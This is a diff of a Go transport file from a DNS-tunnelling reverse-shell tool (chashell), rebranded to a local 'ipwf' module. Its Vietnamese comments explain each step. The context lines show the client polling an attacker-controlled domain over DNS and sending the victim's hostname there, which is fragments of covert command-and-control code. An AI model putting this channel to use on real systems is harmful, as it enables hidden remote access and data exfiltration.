@@ -1,8 +1,8 @@
 package transport
 
 import (
-	"github.com/hdqb/chashell/lib/logging"
-	"github.com/hdqb/chashell/lib/protocol"
+	"ipwf/lib/logging"
+	"ipwf/lib/protocol"
 	"os"
 	"strings"
 	"time"
@@ -50,7 +50,7 @@ func poll(stream dnsStream) {
 
 	// khởi tạo hàm answers bằng giá trị trả về của function sendDNSQuery giá trị 1 là byte của pollPacket
 	answers, err := sendDNSQuery([]byte(pollPacket), stream.targetDomain)
-	
+
 	// kiểm tra nếu có lỗi thì ghi lại một dòng nhật ký
 	if err != nil {
 		logging.Printf("Could not get answer : %v\n", err)
@@ -61,7 +61,7 @@ func poll(stream dnsStream) {
 	if len(answers) > 0 {
 		// khởi tạo packetData bằng cách gộp tất cả mảng trong answers thành giá trị string
 		packetData := strings.Join(answers, "")
-		// kiểm tra nếu packetData bằng - thì trả lại 
+		// kiểm tra nếu packetData bằng - thì trả lại
 		if packetData == "-" {
 			return
 		}
@@ -80,7 +80,7 @@ func poll(stream dnsStream) {
 }
 
 func sendInfoPacket(stream dnsStream) {
-	// khởi tạo name client với giá trị bằng tên của hệ thống 
+	// khởi tạo name client với giá trị bằng tên của hệ thống
 	name, err := os.Hostname()
 	//  kiểm tra nếu có lỗi khi gọi chức năng os.Hostname() thì hiển thị ra một lỗi
 	if err != nil {
@@ -88,7 +88,7 @@ func sendInfoPacket(stream dnsStream) {
 		return
 	}
 
-	// khởi tạo một infoQuery bằng cách gói các dữ liệu lại dưới đạng protobuf 
+	// khởi tạo một infoQuery bằng cách gói các dữ liệu lại dưới đạng protobuf
 	infoQuery := &protocol.Message{
 		Clientguid: stream.clientGuid,
 		Packet: &protocol.Message_Infopacket{
@@ -101,7 +101,7 @@ func sendInfoPacket(stream dnsStream) {
 
 	//gọi chức năng sendDNSQuery để gửi dữ liệu đi khi đã mã hóa dữ liệu bằng pollPacket dnsMarshal(infoQuery, stream.encryptionKey, true)
 	_, err = sendDNSQuery([]byte(pollPacket), stream.targetDomain)
-	
+
 	// nếu có lỗi thì trả về
 	if err != nil {
 		return
